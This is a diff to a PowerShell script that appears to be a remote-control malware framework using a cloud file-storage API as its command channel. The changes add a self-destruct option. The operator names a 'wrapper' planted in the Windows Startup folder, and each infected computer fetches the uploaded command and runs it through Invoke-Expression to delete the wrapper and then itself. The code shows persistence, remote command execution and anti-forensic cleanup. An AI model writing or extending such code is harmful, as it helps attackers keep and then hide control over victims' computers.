@@ -259,6 +259,15 @@ function Send-SelfDestruct {
         return 
     }
 
+    $removeWrapper = Read-Host "Destruct wrapper [y/n]"
+    if ($removeWrapper -eq "" -or $removeWrapper -eq "y" -or $removeWrapper -eq "Y") {
+        $wrapperName = Read-Host "Path: STARTUP\"
+        if ($wrapperName) {
+            $wrapperPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\$wrapperName"
+            $removeCommand = "Remove-Item '$wrapperPath' -Force -ErrorAction SilentlyContinue; "
+        }
+    }
+
     try {
         Write-Host "Getting access token..." -ForegroundColor White
 
@@ -285,6 +294,11 @@ function Send-SelfDestruct {
         }
 
         $fileContent = if ($TargetComputer) { "/$TargetComputer" } else { "" }
+        if ($removeCommand) {
+            $fileContent += "`nWRAPPER_REMOVAL:`n$removeCommand`n" + 
+                           "Remove-Item '$PSCommandPath' -Force -ErrorAction SilentlyContinue"
+        }
+
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
 
         $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes
@@ -294,6 +308,11 @@ function Send-SelfDestruct {
         } else {
             Write-Host "Self destruct command sent for ALL computers" -ForegroundColor DarkGreen
         }
+
+        if ($removeCommand) {
+            Write-Host "Wrapper removal command included for: $wrapperName" -ForegroundColor DarkGreen
+        }
+
         Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
         Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White
 
@@ -594,23 +613,37 @@ function Check-SelfDestruct {
             `$selfDestructContent = ""
         }
         `$shouldSelfDestruct = `$false
-        if (`$selfDestructContent.Trim() -eq "") {
-            `$shouldSelfDestruct = `$true
-            Write-Host "General self-destruct command received" -ForegroundColor DarkYellow
-        } else {
-            `$targetComputer = `$selfDestructContent.Trim()
-            if (`$targetComputer.StartsWith("/")) {
-                `$targetComputer = `$targetComputer.Substring(1)
-            }
+        `$wrapperRemovalCommand = `$null
+        if (`$selfDestructContent -match "WRAPPER_REMOVAL:`n(.*?)(`n|`$)") {
+            `$wrapperRemovalCommand = `$matches[1].Trim()
+        }
+        `$targetComputer = `$null
+        if (`$selfDestructContent -match "^/([^`n]+)") {
+            `$targetComputer = `$matches[1].Trim()
+        }
+        if (`$targetComputer) {
             if (`$env:COMPUTERNAME -eq `$targetComputer) {
                 `$shouldSelfDestruct = `$true
                 Write-Host "Targeted self-destruct command received for this computer" -ForegroundColor DarkYellow
             } else {
                 Write-Host "Self-destruct command received, but targeted for: `$targetComputer" -ForegroundColor DarkYellow
+                `$shouldSelfDestruct = `$false
             }
+        } else {
+            `$shouldSelfDestruct = `$true
+            Write-Host "General self-destruct command received" -ForegroundColor DarkYellow
         }
         if (`$shouldSelfDestruct) {
             Write-Host "Initiating self-destruct sequence..." -ForegroundColor DarkYellow
+            if (`$wrapperRemovalCommand) {
+                Write-Host "Removing wrapper..." -ForegroundColor DarkYellow
+                try {
+                    Invoke-Expression `$wrapperRemovalCommand
+                    Write-Host "Wrapper removed successfully" -ForegroundColor DarkGreen
+                } catch {
+                    Write-Host "Failed to remove wrapper: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
+                }
+            }
             Delete-File -accessToken `$accessToken -filePath "/selfdestruct.txt" | Out-Null
             `$scriptPath = `$MyInvocation.MyCommand.Path
             if (-not `$scriptPath) {
